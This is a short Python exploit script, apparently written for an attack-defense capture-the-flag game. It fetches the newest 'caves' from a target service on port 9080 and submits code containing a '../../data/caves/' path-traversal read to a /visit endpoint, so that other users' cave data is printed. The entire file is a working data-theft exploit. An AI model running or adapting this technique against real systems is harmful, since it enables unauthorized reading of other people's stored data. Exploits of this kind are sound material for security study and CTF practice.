from __future__ import print_function, unicode_literals

import sys

import requests


def exploit(target):
	url = 'http://{}:9080/api'.format(target)
	# newest cave
	caves = requests.get(url + '/caves/list').json()
	caves.sort(key=lambda cave: cave['created'])
	caves = caves[-20:]

	for cave in caves:
		code = 'holmol "../../data/caves/{}";'.format(cave['id'])
		response = requests.post(url + '/visit', json={"cave_id": cave['id'], "files": {"entry.sl": code}})
		print('Status:', response.status_code)
		print(response.text)


if __name__ == '__main__':
	if len(sys.argv) > 1:
		exploit(sys.argv[1])
	else:
		exploit('localhost')
